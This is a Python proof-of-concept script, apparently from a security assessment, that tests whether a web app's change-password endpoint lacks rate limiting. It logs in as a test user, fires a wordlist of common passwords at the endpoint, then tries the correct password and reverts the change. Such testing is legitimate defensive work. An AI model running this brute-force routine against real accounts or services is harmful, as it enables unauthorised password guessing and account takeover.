#!/usr/bin/env python3
"""
AUTH-VULN-02: No rate limiting on POST /api/client/change-password
Tests whether the endpoint enforces rate limiting on password change attempts.
"""

import urllib.request
import urllib.error
import json
import time

TARGET = "http://host.docker.internal:3000"
LOGIN_EMAIL = "idor.test@attacker.com"
LOGIN_PASSWORD = "TestPassword123"

# Wordlist of wrong passwords to try
WRONG_PASSWORDS = [
    "password", "123456", "password123", "admin", "letmein",
    "qwerty", "abc123", "monkey", "master", "dragon",
    "shadow", "sunshine", "princess", "football", "iloveyou",
    "welcome", "login", "solo", "passw0rd", "starwars",
    "batman", "superman", "trustno1", "hello123", "freedom",
    "whatever", "qazwsx", "michael", "jessica", "password1",
    "wrongpass1", "wrongpass2",
]

def make_request(url, data=None, headers=None, cookie=None):
    """Make an HTTP request and return (status_code, response_body)."""
    req_headers = {"Content-Type": "application/json"}
    if headers:
        req_headers.update(headers)
    if cookie:
        req_headers["Cookie"] = cookie

    body = json.dumps(data).encode("utf-8") if data else None
    req = urllib.request.Request(url, data=body, headers=req_headers, method="POST")

    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return 0, str(e)


def login():
    """Login and return the session cookie value."""
    print("[*] Step 1: Logging in to obtain session token...")
    url = f"{TARGET}/api/client/login"
    payload = {"email": LOGIN_EMAIL, "senha": LOGIN_PASSWORD}
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req) as resp:
            status = resp.status
            body = resp.read().decode("utf-8", errors="replace")
            # Extract Set-Cookie header
            set_cookie = resp.getheader("Set-Cookie", "")
            token = None
            for part in set_cookie.split(";"):
                part = part.strip()
                if part.startswith("skylapse-client-token="):
                    token = part  # keep as "name=value" for Cookie header
                    break
            return status, body, token
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace"), None


def main():
    # Step 1: Login
    login_status, login_body, cookie = login()
    print(f"    Login status: {login_status}")
    print(f"    Cookie obtained: {'YES - ' + cookie[:60] + '...' if cookie else 'NO'}")
    if not cookie:
        print("[!] Login failed or no cookie returned. Cannot proceed.")
        print(f"    Response: {login_body[:200]}")
        return

    print()
    print("[*] Step 2: Sending 30+ rapid change-password requests with WRONG passwords...")
    print(f"    Endpoint: POST {TARGET}/api/client/change-password")
    print(f"    Using cookie: {cookie[:60]}...")
    print()
    print(f"{'Attempt':<8} {'Password Tried':<25} {'Status':<8} {'Response (truncated)'}")
    print("-" * 90)

    url = f"{TARGET}/api/client/change-password"
    total = 0
    rate_limited = 0
    wrong_password_errors = 0
    success_200 = 0
    other_errors = 0

    for i, pwd in enumerate(WRONG_PASSWORDS, start=1):
        payload = {"senhaAtual": pwd, "novaSenha": "NewPassword456!"}
        status, body = make_request(url, data=payload, cookie=cookie)
        total += 1

        body_truncated = body.replace("\n", " ").strip()[:100]

        if status == 429:
            rate_limited += 1
            label = "RATE-LIMITED"
        elif status == 200:
            success_200 += 1
            label = "SUCCESS"
        elif status in (400, 401, 403, 422):
            wrong_password_errors += 1
            label = "REJECTED"
        else:
            other_errors += 1
            label = f"OTHER({status})"

        print(f"{i:<8} {pwd:<25} {status:<8} [{label}] {body_truncated}")

    print()
    print("[*] Step 3: Now trying with the CORRECT current password to show brute-force viability...")
    correct_payload = {"senhaAtual": LOGIN_PASSWORD, "novaSenha": "NewPassword456!"}
    status, body = make_request(url, data=correct_payload, cookie=cookie)
    total += 1
    body_truncated = body.replace("\n", " ").strip()[:100]

    if status == 200:
        success_200 += 1
        label = "SUCCESS"
        # Revert the password back
        print(f"    CORRECT password attempt: Status={status} [{label}] {body_truncated}")
        print("    [!] Password was changed! Reverting back to original...")
        revert_payload = {"senhaAtual": "NewPassword456!", "novaSenha": LOGIN_PASSWORD}
        revert_status, revert_body = make_request(url, data=revert_payload, cookie=cookie)
        print(f"    Revert status: {revert_status} - {revert_body[:80]}")
    elif status == 429:
        rate_limited += 1
        label = "RATE-LIMITED"
        print(f"    CORRECT password attempt: Status={status} [{label}] {body_truncated}")
    else:
        wrong_password_errors += 1
        label = "REJECTED"
        print(f"    CORRECT password attempt: Status={status} [{label}] {body_truncated}")

    print()
    print("=" * 60)
    print("SUMMARY - AUTH-VULN-02 Test Results")
    print("=" * 60)
    print(f"  Total attempts made:              {total}")
    print(f"  Rate-limited (429):               {rate_limited}")
    print(f"  Wrong password rejected:          {wrong_password_errors}")
    print(f"  Successful changes (200):         {success_200}")
    print(f"  Other errors:                     {other_errors}")
    print()
    not_rate_limited = total - rate_limited
    print(f"  Requests NOT rate-limited:        {not_rate_limited} / {total}")
    print()
    if rate_limited == 0:
        print("VERDICT: VULNERABLE - No rate limiting detected.")
        print("         All {total} requests went through without any 429 responses.".format(total=total))
        print("         An attacker can brute-force the change-password endpoint freely.")
    elif rate_limited < total * 0.5:
        print(f"VERDICT: PARTIALLY VULNERABLE - Only {rate_limited}/{total} requests were rate-limited.")
        print("         Rate limiting is insufficient to prevent brute-force attacks.")
    else:
        print(f"VERDICT: PROTECTED - {rate_limited}/{total} requests were rate-limited.")
        print("         Rate limiting appears to be in place.")
    print("=" * 60)


if __name__ == "__main__":
    main()
